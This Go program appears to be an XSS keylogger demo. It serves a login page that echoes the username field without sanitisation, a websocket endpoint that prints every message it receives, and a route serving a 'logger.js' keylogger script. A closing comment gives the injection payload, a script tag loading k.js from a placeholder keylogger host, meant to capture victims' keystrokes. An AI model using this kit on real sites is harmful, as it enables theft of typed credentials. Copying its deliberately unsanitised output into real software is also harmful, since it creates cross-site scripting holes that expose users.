package main

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true }, //accepts ws from any source
	}
	listenAddr string
	wsAddr     string
	jsTemplate *template.Template
)

func init() {
	// parsing use flags
	flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
	flag.Parse()
	// making the logger js template
	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}

func serveWS(w http.ResponseWriter, r *http.Request) {
	// upgrading to websocket and checking for errors
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
	}
	defer conn.Close()
	fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
	// print user input to standard output
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			return
		}
		fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
	}
}

// serves the logger.js file
func loggerScript(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "applicatoin/javascript")
	jsTemplate.Execute(w, wsAddr)
}

// serves the html page and on POST requests prints the username as a <p> tag without doing any sort of sanitization
func loginPage(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		userInput := r.FormValue("username")
		fmt.Fprintf(w, "<p style='color:red;'>username not found : %s</p>", userInput)
	}
	http.ServeFile(w, r, "login.html")
}
func main() {
	//serving the router
	r := mux.NewRouter()
	r.HandleFunc("/ws", serveWS)
	r.HandleFunc("/k.js", loggerScript)
	r.HandleFunc("/login", loginPage)
	log.Fatal(http.ListenAndServe(":8080", r))
}

// USE THIS SCRIPT IN USERNAME INPUT TO INITIALIZE THE KEYLOGGER
//<script src='http://<wskeylogger_ip>:<port>/k.js'></script>
